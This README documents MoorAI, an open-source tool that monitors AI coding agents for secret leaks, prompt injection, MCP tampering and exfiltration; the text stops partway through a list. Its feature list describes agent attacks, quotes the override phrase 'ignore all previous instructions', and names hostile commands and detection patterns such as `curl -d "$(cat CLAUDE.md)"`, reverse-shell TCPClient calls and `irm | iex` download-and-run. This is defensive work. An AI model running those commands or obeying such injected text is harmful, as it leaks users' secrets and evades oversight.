<div align="center">

# MoorAI

### AI security at the point.

[![License: MIT](https://img.shields.io/badge/License-MIT-3ecf8e.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Windows%20%7C%20Linux-e4e4ef.svg)](#install)
[![Build: Windows](https://github.com/gitayg/moorai/actions/workflows/release-windows.yml/badge.svg)](https://github.com/gitayg/moorai/actions)

**Runtime guardrails for AI agents, apps and APIs.** MoorAI checks what goes into an agent and what the agent reads, runs and replies, where it happens: in coding agents (Claude Code, Codex, Copilot CLI, Gemini CLI, Cursor) through their hooks, in Claude Agent SDK services in-process, in any agent framework or app through a localhost sidecar (`moorai-serve`), in front of remote MCP servers (`moorai-mcp-gateway`) and between an agent and its model API (`moorai-model-proxy`). Secrets, PII, and source code are never sent anywhere to be checked. Your security team sees content-free signals, never the prompts.

Let your engineers use AI freely. Keep your data in-house.

</div>

---

## The problem

Your developers use Claude Code, Cursor, and Copilot. Those agents don't just read what's typed — they **read files into context** (a stray `.env`), **call MCP tools** with whatever arguments they were given, and **reply** with whatever the model generates. Prompt review alone misses most of it, and every cloud DLP tool solves it by **sending your prompts to their servers to inspect**.

That's the exact trade MoorAI refuses.

## What it does

- **Context interception** — stops a secret or PII being *read into the agent's context* (e.g. an agent slurping a `.env`), not just typed in a prompt. Via the agent's PreToolUse hooks, on-device. An enrolled device enforces the policy (block, or hold for sign-off); a device that isn't enrolled coaches: the agent is told what it touched and the read goes ahead. What comes back into the agent — command output, MCP results, sub-agent reports, fetched pages — is scanned after the tool runs as untrusted inbound content.
- **Agency Enforcement** — bounds what an agent is *allowed to do*: inspects `mcp__*` tool-call arguments for secrets/policy violations and blocks them, and enforces an approved-MCP-server allow-list at call time — with a **discovered → approved/denied approval-gating lifecycle** in the console. An empty allow-list (`mcpAllow: []`, the console default) is no allow-list: it blocks nothing and marks no server unapproved, on every surface. With the console's approval gate (`mcpGate`) on, the list is the approved set, so a server not approved yet is denied, including when nothing is approved. An argument that names a local file (`{"path": "customers.csv"}`, `~/…`, `file://…`) gets that file checked the way a `Bash` command's read path is: its content at the `file` stage, its metadata (#72) and its location against the credential list (#55), in the Claude Code hook and in the MCP proxy, which refuses a blocked call before the real server sees it. At most 12 files, 256 KB each, 1 MB and 1 s per call; anything past the caps is skipped silently, and a file named by path cannot be masked, so `mask` resolves to its fallback. The direct control for **OWASP LLM06: Excessive Agency**. Details and limits: [`docs/DETECTION_ENGINE.md`](docs/DETECTION_ENGINE.md) §6, §13.
- **AI output review** — reviews what the agent says *back*, not just what's typed. On-device output screening flags **secrets, PII, and insecure code the agent generates** (SQL injection, XSS, command injection, `eval`/dynamic exec, weak crypto, unsafe deserialization) and masks secret spans on the `-p` path — emitting only a content-free verdict, never the reply. An intra-file **taint-lite** check (dependency-free source→sink proximity) raises a high-confidence *confirmed tainted-flow* signal when untrusted input actually reaches one of those sinks, so the console can prioritize real flows over hardcoded-literal matches.
- **Index / RAG payload inspection** — content headed for a vector store or retrieval index is scanned at the engine's `index` stage before it is embedded, so a poisoned chunk is caught before it can be retrieved into someone's context. Three integration points: `scanBeforeEmbed` / `guardEmbed` in `@moorai/agent-sdk` for an app that runs its own ingestion, `POST /v1/index-scan` on `moorai-serve` for any framework, and vector-store write tools (`add_documents`, `upsert`, `store_memory`, … on Chroma, Qdrant, Pinecone, Weaviate, mem0 and the like) seen by the MCP proxy and gateway. Report-first; `policy.indexScanAction: "block"` drops or refuses an instruction-carrying chunk. MoorAI has no vector store of its own: an app that embeds without calling one of these is not covered. Details: [*Content headed for an index*](#content-headed-for-an-index-rag-ingestion).
- **Provider-anchored secrets engine** — ~14 provider families (GitHub, AWS, Stripe, Slack, GCP, OpenAI/Anthropic, DB connection strings, …) plus Shannon-entropy scoring with an allowlist (UUIDs, git SHAs, base64) so it doesn't false-positive on the things that aren't secrets.
- **Model-endpoint allow-listing** — bounds *which LLM endpoints* an agent may talk to. A base-URL override (`ANTHROPIC_BASE_URL=…`) or a direct call to a non-approved provider is flagged/blocked at the endpoint — the exfil-via-rogue-endpoint defense, host-level and content-free (loopback / local models always allowed).
- **Transit-override detection (#67)** — the allow-list above asks *where* the agent is sending; this asks *what the traffic passes through on the way*. Setting `HTTPS_PROXY` plus a CA override (`NODE_EXTRA_CA_CERTS`, `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, …) on an agent leaves the destination untouched — so the endpoint allow-list still passes it — while every request transits an interceptor that reads the prompt, the generated code and the API key in cleartext. Measured, not theorised: with those two variables set, a real Claude Code session decrypted at the proxy with the client reporting the TLS as **authorized**, because the injected CA makes the forged chain legitimately trusted. It needs no privileges. **Status: not wired yet.** The decision function (`decideTransit` in `cli/hook-core.mjs`) is built and unit-tested — it reports a proxy or CA override and denies an unsanctioned proxy when `policy.transitAllow` is set, by proxy **host** and variable **name** only, never the CA path or its contents — but no shipped hook calls it, so MoorAI does not report transit overrides today.
- **Slopsquatting firewall** — an offline typosquat / hallucinated-package classifier (Damerau-Levenshtein against a curated popular-package list + a known-bad set) gates `npm/pip/cargo install` of near-miss names (`reqeusts`, `lodahs`) and documented hallucinations, checked entirely on-device (name only).
- **MCP hardening** — an approval-gating lifecycle for MCP servers, **rug-pull detection** (a server whose config changes after approval is knocked back to pending), **tool drift blocking** (policy `mcpToolDrift: "block"`: a tool whose description or schema changed since an admin approved the server, a tool added after approval, or a tool name another server owns is removed from the agent's tool list and its calls are refused until re-approval; the approved tool fingerprints ride in the signed policy; see [`mcp-proxy/README.md`](mcp-proxy/README.md)), an **invisible-payload scanner** (Unicode tag-block / ANSI escapes / bidi-override / variation-selector smuggling) that catches instructions hidden from human review, and a tool-description check that reports a tool telling the model to read a credential file (`~/.ssh/id_rsa`, `~/.aws/credentials`, `.env`, a browser or keychain store) and pass its contents into a call.
- **Skill Analysis** — an inventory + *intent* view of the whole **skill surface** an agent auto-loads, not just its rules file: `SKILL.md` and `.claude/skills/**`, subagent definitions (`.claude/agents/*.md`), slash commands (`.claude/commands/**`), MCP server configs (`.mcp.json`, `~/.claude.json`, `managed-mcp.json`, `claude_desktop_config.json`), the settings files that can carry **hooks** (`.claude/settings.json`, `settings.local.json`, `managed-settings.json`), plugin manifests and their hook/monitor declarations, path-scoped rules and memory files, plus the other vendors' equivalents: rules and instruction files (`.cursorrules`, `.windsurfrules`, Windsurf and Cline rule folders, Copilot `.github/instructions`, Codex `AGENTS.override.md`, `GEMINI.md`, Amp `AGENT.md`, Kiro steering), the settings files that carry hooks or MCP servers (`.gemini/settings.json`, `.amp/settings.json`, `opencode.json`, Kiro hooks), and the commands, workflows, prompt files, custom agents and specs an agent injects when invoked (Cursor, Windsurf, Cline, Copilot, Codex, Gemini, OpenCode, Kiro). Every file gets its **kind**, a set of **intent category labels** — *hidden-instructions*, *instruction-override*, *external-network-egress*, *security-control-or-privilege-change*, *references-credentials*, *invisible-characters*, … — and a **drift fingerprint** per file. The labels are renames of findings the existing detection engine already produced; **no text, matched span, or excerpt is ever attached**, so a poisoned skill can be triaged without reading it off the device.
- **Per-agent destination map** — the observed counterpart to your allow-lists: for each agent/tool, *which external destinations it actually reached*. **Hosts** (never a URL path or query string — they are not captured in the first place) and **MCP server names**, with call counts, first/last-seen, and the allow/ask/deny verdict each call actually got. Kept in an on-device ledger; the console gets one content-free alert the first time an agent touches a new destination, over the existing alert path. View it with `moorai-destinations`.
- **Agent entitlement envelope** — declare each agent's authorized tools / path-prefixes / MCP servers; an action outside the envelope is flagged as **entitlement drift** and alerted or blocked — least-privilege for agents, content-free.
- **Declared workload profiles** — write down what a workload is expected to use: tools, MCP servers and destination hosts, per service (`serviceId`) or per repository (`github:owner/name`). A call outside the profile is reported as `PROFILE_DRIFT` (the kind, the out-of-profile tool, server or host, and the profile id; never a path, command or argument), or denied when the profile says `"action": "block"`; an unenrolled device coaches instead. Profiles live in the signed console policy or the root-owned machine-wide config, never in the repository. A repository match follows the git remote, which the agent can change, so block on `serviceId`. The hook, `@moorai/agent-sdk` and `moorai-serve` evaluate them, and so does the HTTP MCP gateway on every `tools/call` (tool and MCP-server kinds; the tool is named `mcp__<route>__<tool>`, as the hook names it). Details: [DETECTION_ENGINE.md](docs/DETECTION_ENGINE.md#declared-workload-profiles).
- **Egress rules** — `egressRules: [{ binary?, host, port?, method?, path?, action }]` plus `egressDefault`, with `action` one of `allow`, `alert` or `block`. They say which binary may reach which host, port, HTTP method and path. They can apply fleet-wide (top level of the signed policy or the root-owned machine-wide config) or per workload profile. `host` is exact or `*.suffix`. The first matching rule decides, and with no match the default applies. An allow rule never matches a field the call does not reveal (no method on `git clone`, no path on `ssh`). The hook, `@moorai/agent-sdk` and `moorai-serve` read the destinations a Bash/PowerShell command, WebFetch or MCP call names: URLs, curl/wget/httpie/Invoke-WebRequest methods, ssh/scp/rsync/git/nc hosts, and nested `sh -c` / `-EncodedCommand` / `$( … )`. A block denies the call (coached when unenrolled). Alert and block post a content-free `EGRESS_RULE` alert (binary, host, port, method, rule; never a path or query). The binary is the command word the line names, not the process that opens the socket. The HTTP MCP gateway and the stdio proxy do not judge egress rules. Details: [DETECTION_ENGINE.md](docs/DETECTION_ENGINE.md#egress-rules).
- **Intent alignment** — flags a risky agent action aimed at something the user's own request never mentioned: an upload to a host the prompt never named, a destructive command or credential read on paths it never named, an MCP write to a service it never named. The `UserPromptSubmit` hook keeps only keyed, device-local hashes of the sites, paths, service names and three labels (*credentials*, *destructive*, *mcp-write*) a prompt mentions — never the prompt. Report-only by default (`policy.intentAlignment: "ask"` raises the call to ask, `"off"` disables it). Lexical; the prompt is captured in Claude Code, Codex, Cursor, Gemini and Copilot — limits below.
- **Session-level escalation** — what one call cannot show, the session can. An injection-class finding on content the agent ingested (a fetched page, a command's output, an MCP result, a file it read) taints the session for 30 minutes, and an outbound action or credential-file read inside that window raises `Agent behavior: outbound action after untrusted content` (#59). Also across calls: a credential read that was staged (copied, written, encoded or archived) and then sent out; an archive then sent out; a mass read (30 distinct files) then an upload of 4 KB or more to a destination new to the session; and slow exfiltration (5 or more transfers of up to 8 KB each to one destination, summing 16 KB or more). A decaying per-session score posts one alert when it crosses its threshold. Report-only by default (`policy.sessionRisk.mode: "ask"` raises the outbound call to ask, `"off"` disables it). The state on disk is keyed hashes and counts only.
- **Runaway circuit breaker** — an agent stuck in a loop: the same call 15 times in 5 minutes with an unchanged result, or a 2–4 call cycle repeated 5 times with unchanged results, raises `Agent behavior: runaway loop` (#38). A result that changes is progress, so `npm test` re-run while the agent fixes the code never trips it. Report-only by default; `policy.circuitBreaker.mode: "deny"` pauses the session's tool calls for 15 minutes. Token spend is not measured: no hook event carries usage.
- **Claimed success vs reality** — at the end of a turn, when the agent's final message says the work succeeded while the turn's commands or MCP calls failed, were denied or were interrupted and were not redone, MoorAI reports `Agent reported success but tool calls failed` (Medium). The message is read in memory, never stored or sent. Report-only, and tuned for precision: on a locked split of a blind-labelled corpus, 100% precision (17 of 17) and 54.8% recall.
- **Verdict provenance** — every alert and every on-device ledger row says which policy decided (`policyId`), which branch decided (`reasonCode`), and whether the verdict was enforced as configured (`AS_CONFIGURED`, `STRENGTHENED`, `LIMITED`, or `UNEVALUATED`). A control that never ran — unreadable input, a hook error, a size cap, break-glass — is recorded as `UNEVALUATED`, never as a pass.
- **Coverage integrity** — the hook sends a content-free daily heartbeat per agent host with the settings that weaken or switch off protection (hooks disabled, `bypassPermissions`, Codex `approval_policy = "never"`, a sandbox off, …), and the desktop app reports when each agent host was last used, independent of every hook. The console raises a finding for an agent in use with no MoorAI hook traffic, a weakened setting, and a hook removed or gone stale.
- **Protected-instruction leak detection (#52)** — reports the rules files an agent runs under (`CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, Copilot, Cursor, Windsurf and Cline rules) leaving the device through the agent: reproduced in what it writes or sends, or uploaded by path (`curl -d "$(cat CLAUDE.md)"`, `gh gist create AGENTS.md`). The files are fingerprinted on-device as keyed hashes of 7-word shingles; no text is stored. Editing the rules file itself, quoting a line or two, and template boilerplate stay silent.
- **MCP server reputation** — scores an MCP server 0-100 the first time it is seen (bands good / fair / poor / bad) from its package name, its launch command and the copy npx already installed, plus, opt-in, a registry lookup (which also checks that the package's declared repository is really its own, from registry provenance or the repository's own manifest, and counts the accounts that can publish it: one is `single-maintainer`, a weak signal at weight 5) and SkillTriage's published verdicts. `moorai-mcp-check <package>` runs ten pre-install checks on a server you have not installed yet. A content-free alert carries the score, band and reason codes; `mcpReputation.blockBelow` refuses a low-scoring server. Details in [`mcp-proxy/README.md`](mcp-proxy/README.md).
- **Local secret-egress detection** — fingerprints your local secret values (`.env`, cloud creds) on-device as keyed one-way hashes and blocks an outbound command or tool-call that carries one verbatim — catching a real secret leaving even when it isn't in a recognizable token shape. Only the hash + a verdict leave.
- **Insecure-defaults screening** — flags misconfigurations agents habitually emit (SSRF, path traversal, XXE, JWT `alg=none`, TLS-verify-off, wildcard CORS, `debug=True`, insecure randomness for tokens, hardcoded creds, world-writable perms, open redirect) — on top of the SQLi/XSS/RCE/deserialization coverage.
- **Sub-agent / A2A oversight** — records agent-to-agent delegation (sub-agent spawns), scans the delegated prompt for injection, and applies the parent's entitlement envelope to the child so a delegated action can't slip past the parent's controls. The delegation alert names a Claude Code built-in sub-agent type (`general-purpose`, `Explore`, `Plan` …) in clear; a custom type's name, which can say what the user is working on, travels only as the tenant-keyed hash. Every hook alert also says which agent it is about (`agentName`: `claude-code`, or `codex` / `cursor` / `gemini` / `copilot` through `moorai-agent-hook`; `gateway` from the HTTP MCP gateway), which the console shows as `agent_name`.
- **MITRE ATLAS agent techniques (v2026.09)** — a link that opens an assistant with a prompt already filled in through `?q=` (`AML.T0131`), ingested content that asks the agent to enumerate its own tools and permissions (`AML.T0133`), a block addressed only to AI clients that contradicts the visible page (`AML.T0134`), markup that renders steering text invisible — same colour as its background, zero font size, a hidden element (`AML.T0068`), an image or link preview whose URL carries conversation data (`AML.T0077`), and directives planted in a file's EXIF, XMP, ID3 or PDF metadata (`AML.T0129`) — the part of a binary file that carries a sentence. Each needs two independent signals to fire, so an ordinary assistant link, a hidden template row or a CI badge stays silent. Cloaking's server-side differential, and instructions hidden in image pixels, audio or video, are **not** covered — see [DETECTION_ENGINE.md §14](docs/DETECTION_ENGINE.md).
- **Jailbreak & injection detection** — high-precision detectors for direct jailbreaks (DAN lineage, developer/god-mode, named personas, chat-template control-token injection) scoped so normal dev prompts don't trip them, with opportunistic local-model escalation on ambiguity.
- **Coach · alert · mask · block · justify · kill** — per policy, per tenant, per device. Nudge, warn, replace a secret or PII span with a content-free tag and let the call proceed, hard-block, require a signed justification, or **kill the session** — terminate the running agent (not just deny the one call) on a critical finding, in both the `-p` guard and the interactive host.
- **Framework crosswalks** — every rule in [`data/threats.json`](data/threats.json) is mapped to the OWASP Top 10 for LLM Applications, MITRE ATLAS, the OWASP Top 10 for Agentic Applications 2026 (`owaspAgentic`, ASI01–ASI10) and the OWASP MCP Top 10 (`owaspMcp`, MCP01–MCP10, still a beta list), with partial credit and its reason recorded where a rule covers a risk only in part. Coverage per framework is in [`docs/BENCHMARK.md`](docs/BENCHMARK.md); the mapping rules and the rejected credits are in [`docs/DETECTION_ENGINE.md`](docs/DETECTION_ENGINE.md) §16.
- **SAF-MCP, agentic AI guidance and ATF crosswalks** — three more frameworks are mapped from their own lists to MoorAI, each in [`data/crosswalks/`](data/crosswalks): the 78 active SAF-MCP techniques (OpenSSF SIG, commit `d3d4029`), the 140 recommendations of *Careful adoption of agentic AI services* (ASD's ACSC with CISA, NSA, the Canadian Centre for Cyber Security, NCSC-NZ and NCSC-UK, 1 May 2026) and the 25 core requirements of the Agentic Trust Framework 0.9.1 (published through the Cloud Security Alliance). Every credit names the MoorAI component and file that earn it; partial credits state their limit, gaps their reason, and organisational items are marked not applicable. `node scripts/crosswalk-report.mjs` prints the counts; the tables, sources and rejected credits are in [`docs/CROSSWALKS.md`](docs/CROSSWALKS.md).
- **Latency and escalation coverage, measured** — [`docs/BENCHMARK.md`](docs/BENCHMARK.md) publishes p50, p95 and p99 (at n ≥ 1000) for in-process scanning, the Agent SDK decision and the hook's whole per-call process, with the Node startup floor beside it. `node scripts/drop-rate.mjs` reports, per surface, which attacks the rules catch, which a miss hands to the on-device model, and which no path routes anywhere, with the reason; method and results are in [`docs/DROP_RATE.md`](docs/DROP_RATE.md).
- **Coach-as-literacy (EU AI Act Art. 4)** — each time MoorAI coaches a developer at the point of use (the *why* + *what-to-do*, mapped to OWASP LLM Top 10 / MITRE ATLAS), it records a **content-free "literacy touchpoint"** (topic + actor hash, never content). The console rolls these into a coverage view — demonstrable evidence of "measures taken" for a training program, not a substitute for one.
- **Context-aware severity** — the same pattern is scored higher by *where* it was caught: a secret read into an agent's context or shipped as an MCP argument outranks one typed into a still-editable prompt.
- **On-device exposure ledger** — a content-free local log of which credential/secret *classes* reached which agent, so an incident-response rotation is targeted, not a blanket burn. Plus a human-override *intent* log — the signal that separates legitimate agentic use from an attack. View both with `moorai-ledger`; nothing leaves the machine.
- **On-device, content-free** — everything is checked locally. The console receives a category, a risk level, and a **keyed** one-way hash (HMAC-SHA-256 under your tenant's enrollment token) — **never** the prompt, the file, or the matched span. The key matters: an *unkeyed* digest of a phone number or an SSN is enumerable, so it is not one-way in practice. A device with no enrollment token emits an explicit non-correlatable marker instead of a weaker hash.
- **Opportunistic on-device model escalation** — when a regex scan is ambiguous and your policy enables it, a *local* model (Ollama on the loopback interface) gives a second opinion. The text goes only to `127.0.0.1`, never off the machine; a failure never changes the decision. Off by default.
- **You control the evidence** — nothing trains anyone's model, and on-device signal logs are pruned on your schedule (`MOORAI_RETENTION_DAYS`, default 90; `0` = keep forever). Content-free by construction, not by promise.

## Why you can trust the "nothing leaves" claim

Because you can read the code. The agent is **MIT and open source** — the whole detection and reporting path is right here. Cloud DLP tools ask you to take "we don't store your prompts" on faith. MoorAI's telemetry is content-free *by construction*, and the construction is auditable.

**Governance without surveillance.**

## Install

**macOS (Apple silicon)** — download the `.dmg` from [app.moorai.dev/download/app](https://app.moorai.dev/download/app) (it is not attached to GitHub Releases), or `brew install --cask gitayg/tap/moorai` — see [packaging/README.md](packaging/README.md). The app updates itself in place.
**Windows** — download the signed `-setup.exe` from [Releases](https://github.com/gitayg/moorai/releases) (built in the open by CI).

Community edition: runs standalone, no account required. **Without enrollment MoorAI coaches**: it runs the
same detection and built-in defaults, and shows you (and, where the agent's hook protocol allows, the agent)
what it caught and the safer way to do it — it never blocks, never asks for sign-off, never ends a session
and posts nothing anywhere. **Blocking, sign-off and session kill apply once the device is enrolled** in a
MoorAI console (free up to 200 users).

### Enroll a device in a management account

Two ways, both in the app's settings panel (the gear in the status bar):

- **Create an account from inside the app** — enter an organisation/admin name and an email,
  press **Create account**, then click the verification link in the email that arrives. The app
  waits on that click and enrolls itself the moment it lands; there is no token to copy. The app
  polls by a single-use, 30-minute claim token only — your email address is never sent back to the
  server, so the wait cannot be used to ask whether some address has an account.
- **Paste an installation token** — for devices provisioned by an admin. Get one from the MoorAI
  portal → **Installs → Create installation**, or provision from a terminal with the `curl` line the
  panel shows. MDM-provisioned installs (Jamf/Intune writing `~/.moorai/config.json`) use this path
  and never see the signup form. The file holds the install token, so on macOS and Linux both the desktop app and the Jamf
  script write it owner-only (0600); on Windows it inherits the user-profile ACL.

**Who an event came from.** An enrolled device's events carry an `actor`: `h2:` + an HMAC-SHA-256 of
`user@host`, keyed with the tenant's enrollment token — the same keyed function as every content hash
(`actorHash` in `cli/content-hash.mjs`). The hook, the `moorai-guard` CLI, the Claude Desktop MCP proxy
and the desktop app compute the same value, so one machine is one actor in the console. The login name
and hostname also travel, so the console can resolve a per-device policy; the console replaces both with
keyed per-tenant pseudonyms (`usr-…`, `dev-…`) on arrival and stores neither. An unenrolled device sends
the `h2:nokey` sentinel as its actor, never a reversible hash.

**Which session an event came from.** Alerts also carry `session`, the same keyed hash (`h2:` + 16 hex of
an HMAC-SHA-256 keyed from the tenant's enrollment token, `contentHash` in `cli/content-hash.mjs`) of the
agent's own session id. Every alert from one session has the same value. The raw id never leaves. The
field is omitted, not null, when no session id is known, and on a device with no key (the `h2:nokey`
sentinel would put every session under one value). The input is the raw id, with no surface label, so
the same id under the same token hashes to the same value on every surface. Who sends it:

- **Claude Code hook**: Claude Code's `session_id`, on every alert a hook run posts. That covers tool
  calls and their results, prompt scans, coaching touchpoints, session risk, the trifecta, session kill,
  the claim check and the session summary. It also goes on the model-escalation worker's alerts for that
  call. It equals the suffix of the session summary's `contentHash` (`summary:<session>`). A sub-agent's
  calls carry the session that spawned it. The background agent-detection and auto-loaded-context scans
  send none, because they judge events and files across sessions.
- **HTTP MCP gateway**: the `Mcp-Session-Id` request header (the 2025-03-26 to 2025-11-25 transport), on
  every alert raised while handling that request, its upstream response included. An `initialize`
  request and the 2026-07-28 transport have no session id, so they send none. Notices posted once per
  process carry the session of the request that first raised them.
- **`@moorai/agent-sdk`**: the hook input's `session_id`. **`moorai-serve`**: the optional `session` field
  of a `/v1/scan`, `/v1/tool-call` or `/v1/index-scan` body (a string of 1 to 256 characters).
- **Not sent** by `moorai-model-proxy` (a Messages or Chat Completions request names no conversation, and
  the proxy does not invent one), the stdio MCP proxy, `moorai-guard`, the desktop app, the browser
  extension or the egress proxy.

### One-line install (CLI guard + Claude Code hooks)

```bash
curl -fsSL https://raw.githubusercontent.com/gitayg/moorai/main/scripts/install.sh | sh
```

Clones to `~/.moorai`, installs dependencies, and registers the on-device PreToolUse hooks. Needs `git` and Node 18+; content-free, no account. Set `MOORAI_NOHOOK=1` to skip hook registration, or `MOORAI_HOME` to change the location.

Until the device is enrolled the hooks coach. In Claude Code a flagged call reaches its normal permission flow
with a note shown to you and handed to the agent, for example:

```
MoorAI coach: flagged via Bash — #54 Output & Code. Safer: For remote access use SSH to a known host; to
test connectivity use a check like nc -z or curl. Not blocked: this device is not enrolled in a MoorAI console.
```

Enroll the device (below) to have the same finding denied, held for sign-off, or end the session, per policy.

### Try the CLI guard in 30 seconds

```bash
npm run guard -- "here is my key sk-ant-api03-... please debug the charge"
# unenrolled: MoorAI coach: flagged 1 issue(s) in this prompt — #39 … Not blocked: … (the prompt is sent)
# enrolled, #39 set to block: ✗ blocked by threat policy (#39) — nothing sent to claude -p
```

### Wire the context-interception hooks into Claude Code

```bash
node cli/moorai-hook.mjs install     # registers PreToolUse, PostToolUse, UserPromptSubmit, PostToolUseFailure, Stop, SubagentStop and PreCompact hooks in ~/.claude/settings.json
node cli/moorai-hook.mjs uninstall   # removes only MoorAI's entries
```

Now a `Read` of a `.env`, a secret in an MCP tool-call argument, or a call to an
unapproved MCP server is blocked before it reaches the agent — content-free,
fails open (governance, not a sandbox).

### Or install it as a Claude Code plugin

```bash
/plugin marketplace add gitayg/moorai      # inside Claude Code
/plugin install moorai@moorai
# or from a shell:
claude plugin marketplace add gitayg/moorai && claude plugin install moorai@moorai
```

The plugin's [`hooks/hooks.json`](hooks/hooks.json) registers the same events and matchers as
`moorai-hook.mjs install`, each running `node "${CLAUDE_PLUGIN_ROOT}/cli/moorai-hook.mjs" --plugin`, so it
needs `node` on `PATH`, and it coaches until the device is enrolled, like the settings install. Use one or
the other. Claude Code runs a plugin's hook and a `settings.json` hook for the same event side by side, so
the plugin copy stands down for every event a live `settings.json` install covers, and it never rewrites
`settings.json`. Updates are pinned to the plugin's version: `claude plugin update moorai@moorai` moves to
a new release. Under a managed `allowManagedHooksOnly`, plugin hooks run only if managed settings
force-enable the plugin (`"enabledPlugins": {"moorai@moorai": true}`); force-enabled plugins are exempt.
Installing from the marketplace makes Claude Code run `npm ci --ignore-scripts` in its copy of the plugin,
which pulls about 20 MB of desktop-app packages (`@xterm`, `@tauri-apps/cli`) the hooks do not use.
`moorai-doctor` recognises a plugin install.

**Which tools the hook actually sees.** `PRETOOL_MATCHERS` in
[`cli/moorai-hook.mjs`](cli/moorai-hook.mjs) is the single source of truth, and it registers
`Read` · `Bash` · `PowerShell` · `mcp__.*` · `Agent` · `Task` · `Write` · `Edit` · `MultiEdit` · `NotebookEdit` · `WebFetch`
(`Agent` is Claude Code's current name for the sub-agent tool; `Task` is the older one).
The write family scans at the **`output`** stage, deliberately not `file`: the file stage pulls in the
71-detector injection family, and an agent writing a doc that quotes *"ignore all previous instructions"*
is a doc, not an attack. Existing installs converge on the current matcher list on ordinary invocations —
only when MoorAI entries are already present, so nothing an operator uninstalled is ever re-added.
The Cursor CLI runs these same hooks but renames the tools: its shell tool arrives as `Shell`, which the
hook treats exactly as `Bash` (Cursor already rewrites the registered `Bash` matcher to `Shell`, so no
extra matcher is registered). A `Read` is also checked against #55 by **path**, so reading a `.env` —
relative, absolute or `~/…`, including `.env.local` / `.env.production` — gets the same `ask` as
`cat .env`; `.env.example` / `.env.sample` / `.env.template` are not flagged.

**PowerShell.** Claude Code on Windows has a `PowerShell` tool, and it is the only shell when Git Bash is
absent. `PreToolUse` and `PostToolUse` both match it, and existing installs converge on the new matchers.
It runs the `Bash` branch under its own name (alerts read `hook:PowerShell`) with a PowerShell grammar for
the files a command reads: `Get-Content`/`gc`/`type`/`Select-String`, `-Path`/`-LiteralPath`, `-InFile`,
`-Attachments`, reads inside `( )` and `$( )` sub-expressions, `[IO.File]::ReadAllText` and its
siblings, and `StreamReader`. `$env:X`, `${env:X}`, `$HOME` and `~` are expanded from the hook's own
environment (case-insensitively on Windows); an unset variable, a single-quoted or backtick-escaped `$` and
`~user` are never guessed. Abbreviated parameters (`-InF`, `-Att`) resolve as PowerShell 7.5 resolves them:
prefix match, an exact name wins, a cmdlet parameter beats a common one, and any other tie is ambiguous, so
nothing is read, because PowerShell refuses to run it. `-EncodedCommand` (any prefix, `-e`, `-ec`, `/`
forms) is decoded under both the PowerShell and `Bash` tools, and so are `iex` / `-Command` string
literals and `'…' | iex`, up to three levels deep; the decoded script meets the command detectors. Every
file it resolves gets its content scanned and the same #55 path check a `Read` gets, so `gc .env` asks.
Uploads include BITS in upload mode, `Send-MailMessage -Attachments` and a copy onto a UNC share
(`\\host\share`). #54 matches `New-Object [-TypeName] [System.]Net.Sockets.TCPClient` and
`[Net.Sockets.TCPClient]::new(`; #57 matches `irm … | iex` and `iex (irm …)` /
`iex (New-Object Net.WebClient).DownloadString(…)` with no `powershell` in front (0 hits on 10,030 benign
strings across 14 corpora). `mask` rewrites apply to the PowerShell command as to a `Bash` one. Measured
p50 is the same as `Bash` (about 150–160 ms at p50 on an Apple M5 Max, no reachable policy server; see [`docs/BENCHMARK.md`](docs/BENCHMARK.md)). Limits:
`powershell -Command "<script>"` payloads, `iex "$(gc .env)"`, `Join-Path $env:X …` and `[IO.FileStream]`
are not followed; reads inside an encoded command over 8,000 characters are not followed (the decoded text
is still scanned, up to 64 KB); a POSIX `~` in a `Bash` command is not expanded; and no live PowerShell run
has been made, so Windows PowerShell 5.1's tie-breaking and its acceptance of `/enc` are unverified.

**Other agents.** `node cli/moorai-agent-hook.mjs <codex|copilot|gemini|cursor> install` registers a
pre-tool hook and a prompt hook in that agent's own config (`~/.codex/hooks.json`, `~/.copilot/hooks/moorai.json`,
`~/.gemini/settings.json`, `~/.cursor/hooks.json`); `uninstall` removes only MoorAI's entries. Each
adapter in [`cli/agent-hooks/`](cli/agent-hooks) translates the agent's hook payload into the Claude
Code shape, runs the same hook (same engine, policy and telemetry), and translates the verdict back.
Each was built from that vendor's documentation and published source, and is tested against fixture
payloads in the documented shape; none has yet been run end to end against the live agent. The prompt
hook (Codex `UserPromptSubmit`, Cursor `beforeSubmitPrompt`, Gemini `BeforeAgent`, Copilot
`userPromptSubmitted`) forwards the prompt for intent alignment and never answers with anything the
model sees; those payloads carry no `source`, so the prompt scan below runs on them only under
`promptScan: "all"`, and reports without blocking. Adapter installs made before it existed get it only when `install` is re-run; the other
agents' configs do not converge on their own. Copilot's `powershell` tool maps to `PowerShell`. Per agent:

| Agent | Blocks before the tool runs | "Ask" | Known gaps |
|---|---|---|---|
| Codex CLI | yes, after the user trusts the hook once in Codex (`/hooks`) | not supported by Codex; becomes a deny with a message | `web_search` runs server-side and never reaches a hook; plan/permission/plugin tools unmapped |
| GitHub Copilot CLI | yes | passed through (Copilot's own prompt; denied when no user is present) | `grep`/`glob` results, skill and agent-messaging tools unmapped; long MCP names can be truncated by Copilot |
| Gemini CLI | yes | passed through (Gemini's confirmation prompt) | `glob`/`grep_search`/`list_directory` unmapped; only web results are scanned after the tool runs |
| Cursor (IDE and `cursor-agent`) | yes, for shell, MCP, file reads, writes, fetch and subagents | shell and MCP only; `cursor-agent` lets an MCP "ask" through | several `preToolUse` tools unmapped; fails open on a hook crash |

All four fail open if the hook crashes or times out, like the Claude Code hook.

`WebFetch` is covered on **both** surfaces, and the split is the point. `PreToolUse` fires *before* the
fetch, so `tool_input` is `{url, prompt}` and the page does not exist yet — that surface scans the
**outbound request** at the **`prompt`** stage and can deny it.

**What comes back into the agent is scanned too.** The `PostToolUse` registration has seven matchers:
`WebFetch` · `WebSearch` · `Bash` · `PowerShell` · `Agent` · `Task` · `mcp__.*`. A `curl`'d page, a `cat`'d file from a
cloned repository, an MCP server's response and a sub-agent's report are scanned at the **`output`**
stage as inbound content, within a 64 KB window. That surface **cannot un-run the tool**: per the Claude
Code hooks reference, a `PostToolUse` block only adds a reason next to the result, and Claude still sees
the original output. An `ask` becomes advisory `additionalContext` telling the model to treat the output
as data, not instructions; an unenrolled device coaches.

Every inbound surface — this hook, the Agent SDK, `moorai-serve`, the model proxy, the MCP proxy and the
HTTP gateway — scans the same decoded text and resolves it with one module, `cli/inbound.mjs`:

- **An instruction aimed at the agent** inside a result (a note for the assistant, a fake system notice,
  a standing rule, within reach of a request to read a secret, send data out, hide it from the user,
